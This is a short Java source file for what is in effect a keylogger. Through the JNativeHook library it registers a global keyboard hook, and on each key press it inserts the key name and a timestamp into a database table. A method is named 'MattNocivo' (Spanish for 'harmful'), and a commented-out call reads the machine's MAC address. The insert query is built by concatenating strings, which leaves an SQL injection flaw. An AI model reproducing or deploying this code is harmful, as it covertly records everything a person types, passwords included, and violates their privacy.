package matt;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import javax.swing.JOptionPane;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Matt implements NativeKeyListener {

    //private MetodoMatt mm = new MetodoMatt();
    //private String bandera = "";
    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            e.printStackTrace();
        }
        GlobalScreen.getInstance().addNativeKeyListener(new Matt());
    }

    public void MattNocivo() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            e.printStackTrace();
        }
        GlobalScreen.getInstance().addNativeKeyListener(new Matt());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {

        CBDD baseDatos = new CBDD().conectar();

        DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        Date date = new Date();
        //System.out.println(dateFormat.format(date));

        if (baseDatos.ejecutar("INSERT INTO dato_matt(dato,fecha_registro) VALUES('" + NativeKeyEvent.getKeyText(e.getKeyCode()) + "','" + dateFormat.format(date) + "')")) {
            //System.out.println("Ejecución correcta!");
        } else {
            JOptionPane.showMessageDialog(null, "Ocurrió un problema al ingresar!", "Error!!", JOptionPane.ERROR_MESSAGE);
        }

        //System.out.print(NativeKeyEvent.getKeyText(e.getKeyChar()));
        //System.out.println();
        //System.out.println(mm.direccionMAC());
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        // TODO Auto-generated method stub

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        // TODO Auto-generated method stub

    }
}
